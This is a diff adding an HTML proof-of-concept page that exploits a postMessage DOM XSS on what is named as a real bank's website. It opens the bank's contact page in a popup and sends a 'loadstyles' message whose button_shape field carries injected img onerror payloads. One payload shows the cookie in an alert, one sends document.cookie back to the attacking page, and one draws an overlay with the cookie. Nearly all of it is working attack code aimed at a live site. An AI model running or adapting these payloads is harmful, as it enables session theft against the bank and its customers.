@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PostMessage DOM XSS PoC</title>
+<style>
+  body { font-family: monospace; margin: 2rem; max-width: 1000px; }
+  button { font-size: 15px; padding: 10px 14px; margin: 4px 8px 4px 0; }
+  pre { background: #f2f2f2; padding: 1rem; white-space: pre-wrap; word-break: break-all; border: 1px solid #ccc; min-height: 3em; }
+  .note { color: #444; font-size: 13px; }
+</style>
+</head>
+<body>
+<h3>www.columbiabank.com — postMessage DOM XSS PoC</h3>
+<p class="note">
+  Open <b>https://www.columbiabank.com/</b> in another tab first and let it finish loading
+  (establishes Cloudflare state). Then click a button and keep the popup open ~10–25 s.
+</p>
+
+<button id="alert">A) alert(document.cookie) in the bank origin</button>
+<button id="exfil">B) exfiltrate document.cookie to this page</button>
+<button id="overlay">C) visible proof overlay on the bank page</button>
+
+<h4>Received from the bank origin:</h4>
+<pre id="out">(nothing yet)</pre>
+
+<script>
+  var BANK = 'https://www.columbiabank.com/contact-us/';
+  var out = document.getElementById('out');
+  var seen = new Set();
+
+  addEventListener('message', function (e) {
+    if (typeof e.data === 'string' && e.data.indexOf('COOKIE:') === 0) {
+      if (!seen.has(e.data)) {
+        seen.add(e.data);
+        out.textContent = e.data + '\n';
+        document.title = 'GOT COOKIE';
+        console.log('GOT_COOKIE:' + e.data);
+      }
+    }
+  });
+
+  function openWith(buttonShape) {
+    var popup = window.open(BANK, 'poc' + Date.now());
+    if (!popup) { out.textContent = 'POPUP BLOCKED — allow popups and click again'; return; }
+    var msg = JSON.stringify({ button_shape: buttonShape, widgetcolor: '#123456', widget_lang: 'en' });
+    var n = 0;
+    var t = setInterval(function () {
+      try { popup.postMessage({ action: 'loadstyles', message: msg }, '*'); } catch (err) {}
+      if (++n > 150) clearInterval(t);
+    }, 400);
+  }
+
+  var P_ALERT = `"><img src=x onerror="if(!window.__p){window.__p=1;alert(document.cookie)}">`;
+  var P_EXFIL = `"><img src=x onerror="top.opener.postMessage('COOKIE:'+document.cookie,'*')">`;
+  var P_OVERLAY = `"><img src=x onerror="(function(){var d=top.document;if(d.getElementById('poc-proof'))return;var o=d.createElement('div');o.id='poc-proof';o.style.cssText='position:fixed;z-index:2147483647;left:0;top:0;right:0;background:#ffffff;color:#000000;font:15px/1.5 monospace;padding:14px;border-bottom:4px solid #b00000;white-space:pre-wrap';o.textContent='XSS PROOF\\norigin: '+top.location.origin+'\\ncookie: '+document.cookie;d.body.appendChild(o);})()">`;
+
+  document.getElementById('alert').onclick = function () { openWith(P_ALERT); };
+  document.getElementById('exfil').onclick = function () { openWith(P_EXFIL); };
+  document.getElementById('overlay').onclick = function () { openWith(P_OVERLAY); };
+</script>
+</body>
+</html>
